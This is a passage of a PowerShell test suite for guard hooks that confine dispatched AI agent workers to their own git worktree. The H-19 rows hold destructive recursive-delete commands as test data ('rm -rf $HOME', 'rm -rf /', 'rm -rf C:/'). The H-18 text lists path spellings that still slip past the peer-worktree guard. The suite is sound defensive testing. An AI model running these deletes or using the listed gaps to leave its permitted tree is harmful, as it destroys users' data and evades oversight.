    if ($h18SavedWorktree) { $env:LAM_WORKTREE = $h18SavedWorktree } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
    if ($h18SavedCeiling) { $env:GIT_CEILING_DIRECTORIES = $h18SavedCeiling } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    Remove-Wp1H18Fixture -Root $h18Root
}
# .ToArray(), NOT @(): in PS 5.1 `$x = @($aGenericList)` throws "Argument types do not match" (measured
# while building this member -- the first run died here after every row had been driven).
$h18Res = $h18Results.ToArray()
$h18Bad = @($h18Res | Where-Object { -not ($_.ok -and $_.recOk) })
$h18OwnOk   = (@($h18Res | Where-Object { $_.kind -eq 'own' -and -not $_.ok }).Count -eq 0)
$h18PeerOk  = (@($h18Res | Where-Object { $_.kind -eq 'peer' -and $_.role -eq 'worker' -and -not $_.ok }).Count -eq 0)
$h18SeatOk  = (@($h18Res | Where-Object { $_.role -eq 'seat' -and -not $_.ok }).Count -eq 0)
$h18CtlOk   = (@($h18Res | Where-Object { ($_.kind -eq 'ctl-deny' -or $_.kind -eq 'ctl-allow') -and -not $_.ok }).Count -eq 0)
$h18LimitOk = (@($h18Res | Where-Object { $_.kind -eq 'limit' -and -not $_.ok }).Count -eq 0)
$h18RecOk   = (@($h18Res | Where-Object { -not $_.recOk }).Count -eq 0)
$h18NrOk    = (@($h18Res | Where-Object { $_.kind -eq 'nr' -and -not $_.ok }).Count -eq 0)
# NON-VACUITY: a table that lost its rows, a tool name or a role would report zero divergences.
$h18nOwn   = @($h18Res | Where-Object { $_.kind -eq 'own' }).Count
$h18nPeer  = @($h18Res | Where-Object { $_.kind -eq 'peer' -and $_.role -eq 'worker' }).Count
$h18nSeat  = @($h18Res | Where-Object { $_.role -eq 'seat' }).Count
$h18nFile  = @($h18Res | Where-Object { $_.tool -eq 'Write' -or $_.tool -eq 'Edit' }).Count
$h18nPs    = @($h18Res | Where-Object { $_.tool -eq 'PowerShell' }).Count
$h18nDeny  = @($h18Res | Where-Object { $_.got -eq 'DENY' }).Count
$h18nNr    = @($h18Res | Where-Object { $_.kind -eq 'nr' }).Count
# b1s5 item 4's table (own 40, peer 68, seat 74, file-tool 10, PowerShell 89, not-reached 6) PLUS b1s6 item 1's:
# three shapes x (tree 62 + wtenv 38 + r1 35) = 405 invocations -- own 66, peer 132, seat 201, file-tool 54,
# PowerShell 174, not-reached 3 -- and the n7 bound row (not-reached 1). b1s6 item 2 moved n1 ('rm -rf ../..') to H-19, where
# the recursive-delete rule refuses it: not-reached 9.
$h18Reached = ($h18nOwn -eq 106) -and ($h18nPeer -eq 200) -and ($h18nSeat -eq 275) -and ($h18nFile -eq 64) -and ($h18nPs -eq 263) -and ($h18nNr -eq 9)
# b1s6 item 1's own conjuncts: each shape driven in full; every shape refusal named by rulings 7/8 with
# the derivation its row expects; and the bounds still stated -- n7 ($WT) and each r1 textual row ALLOW.
$h18ShapeCounts = @(@('m1a', 'm1b', 'm2') | ForEach-Object { $sk = $_; @($h18Res | Where-Object { $_.shape -eq $sk }).Count })
$h18ShapeReached = (@($h18ShapeCounts | Where-Object { $_ -ne 135 }).Count -eq 0) -and ($h18ShapeCounts.Count -eq 3)
$h18nProv  = @($h18Res | Where-Object { $_.deriv -and $_.role -eq 'worker' }).Count
$h18ProvOk = (@($h18Res | Where-Object { $_.deriv -and $_.role -eq 'worker' -and -not $_.provOk }).Count -eq 0) -and ($h18nProv -eq 132)
$h18BoundRows = @($h18Res | Where-Object { $_.id -eq 'n7' -or ($_.shape -and $_.kind -eq 'nr') })
$h18BoundsOk = ($h18BoundRows.Count -eq 4) -and (@($h18BoundRows | Where-Object { $_.got -ne 'ALLOW' }).Count -eq 0)
$h18detail = @"
    THE PEER-WORKTREE RULE (b1s5 item 4). A dispatched worker is refused every path under a sibling
    worktree home <parent-of-repo>/<repo>-worktrees/ except
    its own wt-<LAM_DISPATCH> tree, and the home itself. Driven through the REAL hook against a hermetic
    fixture under the temp root; worker = LAM_DISPATCH=$h18Worker, seat = unset.
      fixture root : $h18Tb
      F-0 fixture shape                                   : $h18F0   (expect True)
$($h18F0Lines -join ([string][char]10))
      OWN rows admitted, this rule silent                 : $h18OwnOk   (expect True -- $h18nOwn invocations)
      PEER rows refused BY THIS RULE (worker)             : $h18PeerOk   (expect True -- $h18nPeer invocations)
      SEAT rows return their base verdict, rule silent    : $h18SeatOk   (expect True -- $h18nSeat invocations)
      DENY control refused / ALLOW control admitted, both roles, never by this rule : $h18CtlOk   (expect True)
      r4 LIMIT (no anchor derives smoke-worktrees) admitted: $h18LimitOk   (expect True -- the control that makes r3 the anchor's)
      one denial record per refusal, none per admission, the peer rule's naming worker '$h18Worker' : $h18RecOk   (expect True -- $h18nDeny refusals)
      not-reached rows ran                                : $h18NrOk   (expect True)
      table reached   : $h18Reached   (expect True -- own 106, peer 200, seat 275, file-tool 64, PowerShell 263, not-reached 9;
                        b1s5 item 4's own 40, peer 68, seat 74, file-tool 10, PowerShell 89, not-reached 6 (n1 since moved to H-19), plus b1s6 item 1's rows)
      divergences     : $($h18Bad.Count)   (expect 0)
    b1s6 ITEM 1 -- THE MISSION-ROOT SHAPES (an 8.3-spelled root; a linked-worktree root), built by git:
      shape fixture root : $h18ShapeRoot
      F-0 shape fixture                                   : $h18ShapeF0   (expect True)
$($h18ShapeF0Lines -join ([string][char]10))
      each shape driven in full (m1a, m1b, m2)            : $h18ShapeReached   (expect True -- $($h18ShapeCounts -join ', ') invocations, 135 each)
      every shape refusal is rulings 7/8's, derivation named: $h18ProvOk   (expect True -- $h18nProv worker refusals, 132)
      the bounds still stated: n7 and each r1 textual row ALLOW : $h18BoundsOk   (expect True -- $($h18BoundRows.Count) rows, 4)
      real checkout's worktree home, derived from git's common dir '$h18Common' : $h18LibHome   (name '$h18RealHomeName', asked for by e08 and e16)
      predicate asked directly at the edges               : $h18PredOk   (expect True)
$($h18EdgeLines -join ([string][char]10))
$($h18Lines -join ([string][char]10))
    WHAT IS NOT REACHED, MEASURED ABOVE (the n-rows) AND STATED SO NO READER MISTAKES A TRIPWIRE FOR A
    BOUNDARY:
      * ANCESTORS of the home: 'rm -rf ../..' names <parent-of-repo>, which holds every peer AND the main
        repository. The PEER rule does not name it -- ruling 4 covers the home, not what contains it (e15). Since
        b1s6 item 2 a worker's RECURSIVE DELETE of it is refused by the recursive-delete rule, so that row moved to
        H-19 (d45); every other verb on the ancestor is still not reached (H-19 b01).
      * SPELLINGS THE SHELL, A TOOL OR A PROVIDER COMPUTES without a home name before the peer: n2 (a ..
        walk behind a computed prefix, PWD here -- the text pops the variable, the shell does not), a
        shell variable that holds the home itself, n3 ('git worktree remove wt-Y', which git resolves
        from the bare last component), n5 (a PowerShell 'FileSystem::' provider qualifier, whose non-empty
        first segment the '..' pops instead of the cwd) and n6 (a drive-relative 'C:..\\', whose target is
        the drive's current directory -- process state, the $HOME class). ALSO NOT REACHED, disclosed here
        but not driven as a row: a '\\.\'-device path carrying an 8.3 ALIAS of the home name (the plain
        '\\?\' form and the literal '\\.\' form ARE refused; only '\\.\' + alias escapes, because the
        library strips '\\?\' but not '\\.\' and the alias then has no drive-rooted prefix to invert). All
        were measured reading the peer; each is the tripwire boundary, not a hole in the rule.
      * LINKS: n4 reads the peer's file through a real junction inside own and is judged by its NAME.
        Creating a link whose target NAMES a peer is refused by this rule (p27, p28); a link that already
        exists is not seen through. Symlinks and hardlinks were NOT driven: the form builder resolves no
        link of any kind, so they are judged by name by construction, not by measurement here.
      * A WORKER NO ANCHOR PLACES UNDER A MAIN REPOSITORY: r4. The resolved matcher then has no home to
        compare against; only literal-name textual spellings are refused -- and, since b1s6 item 1, the
        home ruling 8 derives from LAM_WORKTREE or CLAUDE_PROJECT_DIR (e31).
      * b1s6 item 1's bounds, measured: the WT-variable spelling (n7) is still not seen with rulings 7 and 8
        armed (e32); a home NAME that is an 8.3 alias or a linked worktree's leaf, behind a computed prefix,
        is refused only through ruling 8's name, so in mode r1 (no anchor places the own tree) the textual
        row ALLOWS (the r1 d5 rows); ruling 7 needs the candidate root ON THE VOLUME (e28: a root that does
        not exist derives nothing) and never walks up from it (e26); a linked worktree of ANOTHER repository
        makes no home (e27); the ANCESTOR of a derived home is not covered (e30), exactly as for rulings 1-2.
      * An 8.3 alias of the worker's OWN segment is REFUSED (it is not literally wt-<LAM_DISPATCH>), a
        fail-closed cost, and a READ-ONLY file tool (Read, Grep, Glob) is not judged -- the file-tool
        route keeps the tool names the rest of the file-tool branch judges.
    PRE-EXISTING, NOT THIS RULE'S: base = ALLOW for p22 'rm -rf ..' from own root. A1's repo-wide
    destructive rule sees the cwd-AUGMENTED command, in which the joined form of '..' is a non-bare
    target, so with a payload cwd known it does not fire for any role; this rule now refuses it to a
    worker, and the seat keeps the pre-existing ALLOW.
"@
Check -Id 'H-18' -Title "a dispatched worker is refused a PEER's tree in a sibling worktree home and the home itself -- by every ordinary relative, subdirectory, backslash, case, trailing-dot, prefix-sharing, bare-id, path-fragment, shell-computed, link-creating and file-tool spelling -- while its OWN tree still allows, the seat returns every base verdict, and each refusal is recorded" `
      -Ok ($h18F0 -and $h18OwnOk -and $h18PeerOk -and $h18SeatOk -and $h18CtlOk -and $h18LimitOk -and $h18RecOk -and $h18NrOk -and $h18Reached -and ($h18Bad.Count -eq 0) -and $h18PredOk -and
           $h18ShapeF0 -and $h18ShapeReached -and $h18ProvOk -and $h18BoundsOk) -Detail $h18detail

# =============================================================================================
# H-19 -- A DISPATCHED WORKER'S RECURSIVE DELETE IS REFUSED WHEN ITS TARGET IS UNCOMPUTABLE, OUTSIDE ITS
#         OWN TREE, OR THE TREE ROOT ITSELF; ORDINARY DELETES INSIDE THE TREE ALLOW; THE SEAT IS UNTOUCHED
#
# =============================================================================================
# THE ORDER (operator, verbatim in substance): "add a worker-scoped rule refusing a recursive delete
# (rm -r/-rf/-fr in any spelling, Remove-Item -Recurse, rmdir /s) whose target is uncomputable (shell
# expansion, ~, %VAR%), outside the worker's own tree, or the tree root itself; ordinary deletes inside the
# tree allow; the seat unaffected; cases both ways including rm -r -f." An earlier revision registered the exposure:
# at the sibling worktree home nothing refused a worker's rm -rf $HOME, rm -rf ~, rm -rf $(echo ../..),
# rm -rf . at its root or rm -rf <own tree> -- the .claude parent tier had refused them only as a side
# effect. The rule, its rulings D1-D5 and its forks F1-F6 are in the library block above
# Test-EvidenceRecursiveDeleteMentioned. THIS IS NOT THE OWN-TREE EXEMPTION (H-11 stays reserved): it only refuses.
#
# THE FIXTURE is built by git itself, with H-18's helpers (Invoke-Wp1H18Git, Test-Wp1H18GitDirInside),
# GIT_CEILING_DIRECTORIES at the temp root and every git dir asserted inside the fixture: a main repository
# project; its sibling home project-worktrees holding the own tree wt-D-OWN and a peer wt-D-PEER as REAL
# linked worktrees; a plain prefix-sharing wt-D-OWN2; a directory outside the home. The own tree's 8.3 alias is
# READ FROM THE VOLUME; a volume that yields none is a RED sentence in F-0, never a skip. Nothing is deleted --
# the guard is only asked.
#
# THREE MODES -- the two anchors the rule reads the own root from, never the payload cwd:
#   tree     CLAUDE_PROJECT_DIR = the own tree (the CLI's real value), LAM_WORKTREE unset;
#   wtenv    LAM_WORKTREE = the own tree (the runner's value), CLAUDE_PROJECT_DIR = this instrument's sandbox;
#   noanchor CLAUDE_PROJECT_DIR = the sandbox, LAM_WORKTREE unset. No anchor places the own tree, so H-18's own
#            deletes o03/o06/o09/o12, spelled here again, are REFUSED: ruling D3's fail-closed cost, measured
#            rather than hidden. H-18 drives the same four with LAM_WORKTREE = the own tree and they allow.
#
# EVERY ROW names the rule that must decide it -- rd (this rule), peer (the peer-worktree rule, which runs first
# and keeps its own sentence), none (admitted) -- and, for this rule, the CONDITION its recorded sentence must
# name: uncomputable, root, outside, or noroot (outside because no own root derives). Worker rows go through
# the REAL hook as Bash and as PowerShell; every row runs again as the SEAT (LAM_DISPATCH unset, Bash) and must
# return `base` -- the verdict the I1_TIP library (this rule absent) returned for it in process, same cwd and
# env -- with this rule silent. Every refusal leaves exactly one denial record naming the rule that refused;
# every admission leaves none.
#
# THE PREDICATE IS ALSO ASKED DIRECTLY (e01-e10): the recognised spellings of (a), (b), (c) and the leads;
# spellings it must NOT recognise; the uncomputable characters; the prefix-sharing sibling the peer rule
# answers for through the hook (the / boundary); the tree root; the payload cwd as no anchor; both halves of the
# failure direction (FORK F4); and the pre-screen's superset claim over a generated spelling corpus.
#
# H-18's n1 ('rm -rf ../..' from the own root, an ANCESTOR of the home) moved here as d45: the peer rule still
# does not name the ancestor, and this rule now refuses a worker's recursive delete of it; b01 keeps the bound
# for every other verb ('ls ../..' still allows).
function New-Wp1H19Fixture {
    <#
      H-19's fixture under $Root. Returns an ordered map of facts; `ok` is $false with a `sentence` when git or
      the volume does not cooperate -- nothing here throws past the caller.
    #>
    param([string]$Root)
    $f = [ordered]@{ ok = $false; sentence = '' }
    try {
        $enc = New-Object System.Text.UTF8Encoding($false)
        $main = Join-Path $Root 'project'
        New-Item -ItemType Directory -Path $main -Force | Out-Null
        $r = Invoke-Wp1H18Git -Dir $main -GitArgs @('init', '-q')
        if ($r.code -ne 0 -or -not (Test-Wp1H18GitDirInside -Dir $main -Inside $main)) { $f['sentence'] = "git init in $main did not yield a git dir inside it ($($r.out))"; return $f }
        [System.IO.File]::WriteAllText((Join-Path $main 'README.txt'), 'main of h19', $enc)
        $null = Invoke-Wp1H18Git -Dir $main -GitArgs @('add', 'README.txt')
        $r = Invoke-Wp1H18Git -Dir $main -GitArgs @('commit', '-q', '-m', 'wp1 h19 fixture')
        if ($r.code -ne 0) { $f['sentence'] = "git commit in $main failed ($($r.out))"; return $f }
        foreach ($w in @('wt-D-OWN', 'wt-D-PEER')) {
            $tree = Join-Path $Root "project-worktrees\$w"
            $r = Invoke-Wp1H18Git -Dir $main -GitArgs @('worktree', 'add', '-q', '-b', "h19-$w", $tree)
            if ($r.code -ne 0 -or -not (Test-Wp1H18GitDirInside -Dir $tree -Inside $main)) { $f['sentence'] = "git worktree add of $w failed or its git dir is outside the fixture ($($r.out))"; return $f }
            $f["gitFile-$w"] = ([System.IO.File]::ReadAllText((Join-Path $tree '.git'))).Trim()
        }
        $own = Join-Path $Root 'project-worktrees\wt-D-OWN'
        foreach ($d in @('src\tmp', 'build', 'out', 'dist', 'node_modules', 'dir with space')) {
            New-Item -ItemType Directory -Path (Join-Path $own $d) -Force | Out-Null
        }
        New-Item -ItemType Directory -Path (Join-Path $Root 'project-worktrees\wt-D-OWN2') -Force | Out-Null
        New-Item -ItemType Directory -Path (Join-Path $Root 'outside') -Force | Out-Null
        $fso = New-Object -ComObject Scripting.FileSystemObject
        $f['main'] = $main
        $f['own'] = $own
        $f['ownShort'] = [string]$fso.GetFolder($own).ShortPath
        $f['worktreeList'] = (Invoke-Wp1H18Git -Dir $main -GitArgs @('worktree', 'list', '--porcelain')).out
        $f['ok'] = $true
    } catch {
        $f['ok'] = $false
        $f['sentence'] = "the H-19 fixture could not be built: $($_.Exception.Message)"
    }
    return $f
}
function New-Wp1H19Row {
    # One H-19 row: mode (tree|wtenv|noanchor), cwd key (own|ownsrc|outside|none), the worker's verdict, the rule
    # that must decide it (rd|peer|none), this rule's condition (uncomputable|root|outside|noroot|''), the base
    # verdict the seat must return, and the command text.
    param([string]$Id, [string]$Mode, [string]$Cwd, [string]$Want, [string]$Rule, [string]$Cond, [string]$Base, [string]$Text)
    return [pscustomobject]@{ id = $Id; mode = $Mode; cwd = $Cwd; want = $Want; rule = $Rule; cond = $Cond; base = $Base; text = $Text }
}

$h19Root     = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h19-' + [guid]::NewGuid().ToString('N'))
$h19Tb       = $h19Root.TrimEnd('\')
$h19Id       = 'session-wp1-rdel'
$h19Worker   = 'D-OWN'
$h19SavedProj     = $env:CLAUDE_PROJECT_DIR
$h19SavedDispatch = $env:MISSION_DISPATCH_ID
$h19SavedWorktree = $env:LAM_WORKTREE
$h19SavedCeiling  = $env:GIT_CEILING_DIRECTORIES
$h19Results   = New-Object System.Collections.Generic.List[object]
$h19Lines     = New-Object System.Collections.Generic.List[string]
$h19F0Lines   = New-Object System.Collections.Generic.List[string]
$h19EdgeLines = New-Object System.Collections.Generic.List[string]
$h19Rows      = @()
$h19F0        = $false
$h19PredOk    = $false
try {
    New-Item -ItemType Directory -Path $h19Root -Force | Out-Null
    $env:GIT_CEILING_DIRECTORIES = ([System.IO.Path]::GetTempPath()).TrimEnd('\')
    $h19Facts = New-Wp1H19Fixture -Root $h19Root
    # ---- F-0 OF THIS MEMBER: THE FIXTURE'S SHAPE, BEFORE ANY ROW IS TRUSTED. --------------------------
    $f0 = [ordered]@{}
    $f0["built by git: $(if ($h19Facts['ok']) { 'ok' } else { $h19Facts['sentence'] })"] = [bool]$h19Facts['ok']
    if ($h19Facts['ok']) {
        $h19MainF = ([string]$h19Facts['main']).Replace('\', '/')
        $f0['project\.git is a DIRECTORY (git init)'] = [System.IO.Directory]::Exists((Join-Path $h19Facts['main'] '.git'))
        foreach ($w in @('wt-D-OWN', 'wt-D-PEER')) {
            $f0["$w .git is git's own FILE: gitdir <main>/.git/worktrees/$w"] = ($h19Facts["gitFile-$w"] -eq "gitdir: $h19MainF/.git/worktrees/$w")
            $f0["git worktree list names $w"] = ([string]$h19Facts['worktreeList']).Contains("/project-worktrees/$w")
        }
        $f0["the own tree's 8.3 alias is read from the volume ('$($h19Facts['ownShort'])')"] = ([string]$h19Facts['ownShort'] -match '~[0-9]')
        $f0['wt-D-OWN2 and outside exist and carry no .git'] = [System.IO.Directory]::Exists("$h19Tb\project-worktrees\wt-D-OWN2") -and
            [System.IO.Directory]::Exists("$h19Tb\outside") -and -not (Test-Path -LiteralPath "$h19Tb\project-worktrees\wt-D-OWN2\.git")
        $f0['the fixture is outside the repository'] = -not $h19Tb.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase)
        $h19ProtAndParent = @($script:EvidenceProtectedPaths) + @($script:EvidenceParentPaths)
        $h19Dirty = @(@($h19Tb.Replace('\', '/'), ([string]$h19Facts['own']).Replace('\', '/'), ([string]$h19Facts['ownShort']).Replace('\', '/')) |
                      Where-Object { @(Get-EvidencePathHits -Text $_ -Patterns $h19ProtAndParent).Count -gt 0 })
        $f0['no fixture path carries a protected/parent component (the library matcher)'] = ($h19Dirty.Count -eq 0) -and ($h19ProtAndParent.Count -eq 10)
        # THE ANCHORS DERIVE THE OWN ROOT, in process, before the hook is asked anything.
        $env:CLAUDE_PROJECT_DIR = $h19Facts['own']
        try { $h19RootsTree = @(Get-EvidenceOwnWorktreeRoots -DispatchId $h19Worker) } finally { $env:CLAUDE_PROJECT_DIR = $h19SavedProj }
        $f0['CLAUDE_PROJECT_DIR = the own tree derives the own root'] = ($h19RootsTree -contains ([string]$h19Facts['own']).Replace('\', '/'))
    }
    $h19F0 = (@($f0.Values | Where-Object { -not $_ }).Count -eq 0)
    foreach ($k in $f0.Keys) { [void]$h19F0Lines.Add(('        [{0}] {1}' -f $(if ($f0[$k]) { 'ok  ' } else { 'FAIL' }), $k)) }

    if ($h19Facts['ok']) {
        $h19Own      = [string]$h19Facts['own']
        $h19OwnF     = $h19Own.Replace('\', '/')
        $h19OwnShort = ([string]$h19Facts['ownShort']).Replace('\', '/')
        $h19Bt       = [string][char]96
        $h19Cwds = @{ own = $h19Own; ownsrc = (Join-Path $h19Own 'src'); outside = "$h19Tb\outside"; none = '' }
        $h19Rows = @(
            # ---- UNCOMPUTABLE: the shell decides the target. ----------------------------------------------
            (New-Wp1H19Row 'd01' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf $HOME'),
            (New-Wp1H19Row 'd02' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf ~'),
            (New-Wp1H19Row 'd03' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf ~/x'),
            (New-Wp1H19Row 'd04' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf %USERPROFILE%'),
            (New-Wp1H19Row 'd05' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf $(echo ../..)'),
            (New-Wp1H19Row 'd07' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf {a,b}'),
            (New-Wp1H19Row 'd08' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf build/*'),
            (New-Wp1H19Row 'd09' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'xargs rm -rf'),
            (New-Wp1H19Row 'd10' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'find . -name x | xargs rm -rf'),
            (New-Wp1H19Row 'd11' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf $WT/wt-D-PEER'),
            (New-Wp1H19Row 'd12' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'Remove-Item -r -fo $HOME'),
            (New-Wp1H19Row 'd13' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' ('rm -rf ' + $h19Bt + 'pwd' + $h19Bt)),
            (New-Wp1H19Row 'd14' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'rm -rf "$HOME"'),
            (New-Wp1H19Row 'd15' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'find . -type d -name node_modules -exec rm -rf {} +'),
            (New-Wp1H19Row 'd16' 'tree' 'ownsrc' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'Remove-Item -Recurse -Force (Get-Item ..)'),
            (New-Wp1H19Row 'd17' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'Get-ChildItem build | Remove-Item -Recurse -Force'),
            (New-Wp1H19Row 'd18' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'Remove-Item -Recurse FileSystem::..'),
            (New-Wp1H19Row 'd19' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'cmd /c rd /s /q C:..\x'),
            # ---- ROOT: the own tree itself, in every spelling of (a), (b), (c) and the leads. ----------------
            (New-Wp1H19Row 'd21' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -rf .'),
            (New-Wp1H19Row 'd22' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' "rm -rf $h19OwnF"),
            (New-Wp1H19Row 'd23' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -rf ../wt-D-OWN'),
            (New-Wp1H19Row 'd24' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -r -f .'),
            (New-Wp1H19Row 'd25' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -fr .'),
            (New-Wp1H19Row 'd26' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -Rf .'),
            (New-Wp1H19Row 'd27' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm --recursive --force .'),
            (New-Wp1H19Row 'd28' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm --rec .'),
            (New-Wp1H19Row 'd29' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm . -rf'),
            (New-Wp1H19Row 'd30' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' '/usr/bin/rm -rf .'),
            (New-Wp1H19Row 'd31' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' '\rm -rf .'),
            (New-Wp1H19Row 'd32' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'command rm -rf .'),
            (New-Wp1H19Row 'd33' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'sudo rm -rf .'),
            (New-Wp1H19Row 'd34' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'env X=1 rm -rf .'),
            (New-Wp1H19Row 'd35' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'bash -c "rm -rf ."'),
            (New-Wp1H19Row 'd36' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'powershell -Command "Remove-Item -Recurse -Force ."'),
            (New-Wp1H19Row 'd37' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rd /S/Q .'),
            (New-Wp1H19Row 'd38' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' "rm -rf $h19OwnShort"),
            (New-Wp1H19Row 'd39' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm -rf ../WT-D-OWN.'),
            (New-Wp1H19Row 'd40' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rm.exe -vfR .'),
            (New-Wp1H19Row 'd41' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'X=1 rm -rf .'),
            (New-Wp1H19Row 'd42' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'if (Test-Path src) { Remove-Item -Recurse -Force . }'),
            (New-Wp1H19Row 'd43' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'rd/s/q .'),
            (New-Wp1H19Row 'd44' 'tree' 'own' 'DENY' 'rd' 'root' 'ALLOW' 'nice -n 10 rm -rf .'),
            # ---- OUTSIDE: ../.. (H-18's n1, moved here), drive roots, the main repository. ------------------
            (New-Wp1H19Row 'd45' 'tree' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf ../..'),
            (New-Wp1H19Row 'd46' 'tree' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf /'),
            (New-Wp1H19Row 'd47' 'tree' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf C:/'),
            (New-Wp1H19Row 'd48' 'tree' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'ri -Recurse C:\'),
            (New-Wp1H19Row 'd49' 'tree' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf C:/work/x'),
            (New-Wp1H19Row 'd50' 'tree' 'own' 'DENY' 'rd' 'outside' 'ALLOW' 'rm -rf ../../project'),
            # ---- ROOT FROM A SUBDIRECTORY: '..' is the own root there, so the peer rule does not answer first.
            (New-Wp1H19Row 'd51' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'Remove-Item -Recurse -Force ..'),
            (New-Wp1H19Row 'd52' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'del -Recurse ..'),
            (New-Wp1H19Row 'd53' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'rd -r ..'),
            (New-Wp1H19Row 'd54' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'rmdir /s /q ..'),
            (New-Wp1H19Row 'd55' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'cmd /c rmdir /s /q ..'),
            (New-Wp1H19Row 'd56' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'rm -f -r ..'),
            (New-Wp1H19Row 'd57' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'erase /s /q ..'),
            (New-Wp1H19Row 'd58' 'tree' 'ownsrc' 'DENY' 'rd' 'root' 'ALLOW' 'cd .. && rm -rf src/../../wt-D-OWN'),
            # ---- THE PEER RULE ANSWERS FIRST (it runs before this rule) and keeps its own sentence. ----------
            (New-Wp1H19Row 'p01' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'rm -rf ..'),
            (New-Wp1H19Row 'p02' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'rm -f -r ..'),
            (New-Wp1H19Row 'p03' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'cd .. && rm -rf wt-D-OWN'),
            (New-Wp1H19Row 'p04' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'Remove-Item -Recurse -Force ..'),
            (New-Wp1H19Row 'p05' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'del -Recurse ..'),
            (New-Wp1H19Row 'p06' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'rd -r ..'),
            (New-Wp1H19Row 'p07' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'rmdir /s /q ..'),
            (New-Wp1H19Row 'p08' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'del /s /q ..\*'),
            (New-Wp1H19Row 'p09' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'cmd /c rmdir /s /q ..'),
            (New-Wp1H19Row 'p10' 'tree' 'own' 'DENY' 'peer' '' 'ALLOW' 'rm -rf ../wt-D-OWN2'),
            # ---- DIRECTORY CHANGES (FORK F3): a literal chain resolves; an uncomputable one does not. --------
            (New-Wp1H19Row 'c01' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'cd src && rm -rf tmp'),
            (New-Wp1H19Row 'c02' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'cd $HOME && rm -rf build'),
            (New-Wp1H19Row 'c03' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'cd - && rm -rf build'),
            (New-Wp1H19Row 'c04' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'popd; rm -rf build'),
            (New-Wp1H19Row 'c05' 'tree' 'own' 'DENY' 'rd' 'uncomputable' 'ALLOW' 'cd && rm -rf build'),
            (New-Wp1H19Row 'c06' 'tree' 'own' 'ALLOW' 'none' '' 'ALLOW' 'pushd src && rm -rf tmp && popd'),
